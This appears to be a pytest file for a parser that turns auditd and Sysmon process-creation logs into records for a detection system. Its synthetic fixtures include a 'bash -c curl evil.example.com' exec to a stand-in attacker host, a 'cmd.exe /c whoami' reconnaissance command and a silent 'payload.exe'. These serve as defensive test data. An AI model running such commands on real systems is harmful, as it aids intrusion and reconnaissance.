#!/usr/bin/env python3
"""
Tests for guest_production_vm/kernel_telemetry.py (v3.12).

Tested against realistic, schema-accurate SYNTHETIC samples of both
formats — not a live auditd daemon or Sysmon install, neither of which
exists in this sandbox. See the module docstring's honesty note: this
proves the PARSER is correct against the documented schema, not that it's
been validated against a live production feed. That's the next step, in
isolation, before trusting it operationally.
"""

import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "guest_production_vm"))

from kernel_telemetry import (  # noqa: E402
    parse_audit_line, parse_audit_lines, parse_sysmon_process_create_xml, parse_sysmon_batch, to_psutil_like,
)


# ---------------------------------------------------------------------------
# auditd
# ---------------------------------------------------------------------------

SAMPLE_AUDIT_SYSCALL = (
    'type=SYSCALL msg=audit(1700000000.123:456): arch=c000003e syscall=59 '
    'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=0 gid=0 '
    'comm="bash" exe="/usr/bin/bash" key="exec_watch"'
)
SAMPLE_AUDIT_EXECVE = (
    'type=EXECVE msg=audit(1700000000.123:456): argc=3 a0="bash" a1="-c" '
    'a2="curl evil.example.com"'
)
SAMPLE_AUDIT_PATH = (
    'type=PATH msg=audit(1700000000.123:456): item=0 '
    'name="/usr/bin/bash" inode=131099'
)
SAMPLE_AUDIT_CWD = 'type=CWD msg=audit(1700000000.123:456): cwd="/home/user"'


class TestAuditdLineParsing:
    def test_parses_syscall_line_fields(self):
        rec = parse_audit_line(SAMPLE_AUDIT_SYSCALL)
        assert rec is not None
        assert rec.type == "SYSCALL"
        assert rec.fields["pid"] == "5678"
        assert rec.fields["ppid"] == "1234"
        assert rec.fields["comm"] == "bash"
        assert rec.fields["exe"] == "/usr/bin/bash"

    def test_quoted_and_bare_fields_both_parse(self):
        rec = parse_audit_line(SAMPLE_AUDIT_SYSCALL)
        assert rec.fields["uid"] == "0"          # bare numeric field
        assert rec.fields["comm"] == "bash"      # quoted string field

    def test_garbage_line_returns_none(self):
        assert parse_audit_line("this is not an audit line at all") is None
        assert parse_audit_line("") is None
        assert parse_audit_line("---- log rotated ----") is None

    def test_execve_argv_reconstruction(self):
        rec = parse_audit_line(SAMPLE_AUDIT_EXECVE)
        assert rec.fields["argc"] == "3"
        assert rec.fields["a2"] == "curl evil.example.com"


class TestAuditdCorrelation:
    def test_correlates_multi_line_event_into_one_process_event(self):
        lines = [SAMPLE_AUDIT_SYSCALL, SAMPLE_AUDIT_EXECVE,
                SAMPLE_AUDIT_PATH, SAMPLE_AUDIT_CWD]
        events = parse_audit_lines(lines)
        assert len(events) == 1
        evt = events[0]
        assert evt.pid == 5678
        assert evt.ppid == 1234
        assert evt.comm == "bash"
        assert evt.exe == "/usr/bin/bash"
        assert evt.cmdline == "bash -c curl evil.example.com"
        assert evt.source == "auditd"

    def test_syscall_alone_without_execve_still_produces_event(self):
        """Not every syscall is an exec — e.g. connect()/openat() syscalls
        get logged without a paired EXECVE record. cmdline is just None."""
        events = parse_audit_lines([SAMPLE_AUDIT_SYSCALL])
        assert len(events) == 1
        assert events[0].cmdline is None

    def test_execve_without_matching_syscall_is_dropped_not_guessed(self):
        """An EXECVE record with no SYSCALL in the same correlation group
        has no pid/ppid to attach to — must be dropped, not fabricated."""
        events = parse_audit_lines([SAMPLE_AUDIT_EXECVE])
        assert events == []

    def test_different_correlation_keys_stay_separate_events(self):
        second = SAMPLE_AUDIT_SYSCALL.replace("456", "789").replace(
            "1700000000.123", "1700000001.456")
        events = parse_audit_lines([SAMPLE_AUDIT_SYSCALL, second])
        assert len(events) == 2

    def test_realistic_multi_process_batch(self):
        """A representative slice of a real audit.log with two unrelated
        exec events interleaved (as they are in a real log, not grouped)."""
        p2_syscall = (
            'type=SYSCALL msg=audit(1700000002.000:789): ppid=1 pid=999 '
            'uid=0 comm="cron" exe="/usr/sbin/cron"'
        )
        lines = [SAMPLE_AUDIT_SYSCALL, p2_syscall, SAMPLE_AUDIT_EXECVE, SAMPLE_AUDIT_PATH]
        events = parse_audit_lines(lines)
        assert {e.pid for e in events} == {5678, 999}

    def test_touched_file_paths_are_surfaced(self):
        """PATH records carry the actual file the syscall touched — needed
        by anything watching specific files (e.g. a honeytoken detector),
        not just process lineage."""
        events = parse_audit_lines(
            [SAMPLE_AUDIT_SYSCALL, SAMPLE_AUDIT_EXECVE, SAMPLE_AUDIT_PATH])
        assert events[0].paths == ["/usr/bin/bash"]

    def test_no_path_records_gives_empty_list_not_error(self):
        events = parse_audit_lines([SAMPLE_AUDIT_SYSCALL])
        assert events[0].paths == []


# ---------------------------------------------------------------------------
# Sysmon
# ---------------------------------------------------------------------------

SYSMON_PROCESS_CREATE_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
 <System>
  <EventID>1</EventID>
  <TimeCreated SystemTime="2026-01-15T10:30:00.123456Z"/>
 </System>
 <EventData>
  <Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
  <Data Name="ProcessId">4321</Data>
  <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
  <Data Name="CommandLine">cmd.exe /c whoami</Data>
  <Data Name="ParentProcessId">1000</Data>
  <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
  <Data Name="ParentCommandLine">explorer.exe</Data>
  <Data Name="User">DESKTOP-X\\alice</Data>
 </EventData>
</Event>"""

SYSMON_NETWORK_CONNECT_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
 <System>
  <EventID>3</EventID>
  <TimeCreated SystemTime="2026-01-15T10:30:05.000000Z"/>
 </System>
 <EventData>
  <Data Name="ProcessId">4321</Data>
  <Data Name="DestinationIp">203.0.113.9</Data>
 </EventData>
</Event>"""

SYSMON_UNNAMESPACED_XML = """<Event>
 <System><EventID>1</EventID>
  <TimeCreated SystemTime="2026-01-15T10:31:00.000000Z"/>
 </System>
 <EventData>
  <Data Name="ProcessId">55</Data>
  <Data Name="Image">C:\\Temp\\payload.exe</Data>
  <Data Name="CommandLine">payload.exe -silent</Data>
  <Data Name="ParentProcessId">1</Data>
  <Data Name="User">SYSTEM</Data>
 </EventData>
</Event>"""


class TestSysmonParsing:
    def test_parses_process_create_event(self):
        evt = parse_sysmon_process_create_xml(SYSMON_PROCESS_CREATE_XML)
        assert evt is not None
        assert evt.pid == 4321
        assert evt.ppid == 1000
        assert evt.comm == "cmd.exe"
        assert evt.exe == "C:\\Windows\\System32\\cmd.exe"
        assert evt.cmdline == "cmd.exe /c whoami"
        assert evt.uid == "DESKTOP-X\\alice"
        assert evt.source == "sysmon"

    def test_non_process_create_event_ids_are_filtered_out(self):
        """Event ID 3 (network connect) is a real, common Sysmon event —
        this parser is specifically for ProcessCreate (ID 1); other IDs
        must be filtered, not misparsed as if they were process events."""
        assert parse_sysmon_process_create_xml(SYSMON_NETWORK_CONNECT_XML) is None

    def test_malformed_xml_returns_none_not_raise(self):
        assert parse_sysmon_process_create_xml("<Event><unclosed>") is None
        assert parse_sysmon_process_create_xml("") is None
        assert parse_sysmon_process_create_xml("not xml at all") is None

    def test_unnamespaced_xml_still_parses(self):
        """Some export/re-serialization tools strip the default XML
        namespace — the parser must handle both forms, proven here rather
        than assumed."""
        evt = parse_sysmon_process_create_xml(SYSMON_UNNAMESPACED_XML)
        assert evt is not None
        assert evt.pid == 55
        assert evt.exe == "C:\\Temp\\payload.exe"

    def test_batch_parsing_filters_mixed_event_stream(self):
        batch = parse_sysmon_batch([
            SYSMON_PROCESS_CREATE_XML, SYSMON_NETWORK_CONNECT_XML,
            SYSMON_UNNAMESPACED_XML, "<garbage/>",
        ])
        assert len(batch) == 2
        assert {e.pid for e in batch} == {4321, 55}


# ---------------------------------------------------------------------------
# Bridge into existing psutil-shaped detection surface
# ---------------------------------------------------------------------------

class TestPsutilBridge:
    def test_auditd_event_reshapes_to_psutil_like_dict(self):
        events = parse_audit_lines([SAMPLE_AUDIT_SYSCALL, SAMPLE_AUDIT_EXECVE])
        d = to_psutil_like(events[0])
        assert d["pid"] == 5678
        assert d["ppid"] == 1234
        assert d["name"] == "bash"
        assert d["cmdline"] == ["bash", "-c", "curl", "evil.example.com"]
        assert d["_source"] == "auditd"

    def test_sysmon_event_reshapes_to_psutil_like_dict(self):
        evt = parse_sysmon_process_create_xml(SYSMON_PROCESS_CREATE_XML)
        d = to_psutil_like(evt)
        assert d["pid"] == 4321
        assert d["name"] == "cmd.exe"
        assert d["_source"] == "sysmon"

    def test_event_with_no_cmdline_reshapes_without_crashing(self):
        events = parse_audit_lines([SAMPLE_AUDIT_SYSCALL])   # no EXECVE paired
        d = to_psutil_like(events[0])
        assert d["cmdline"] == []
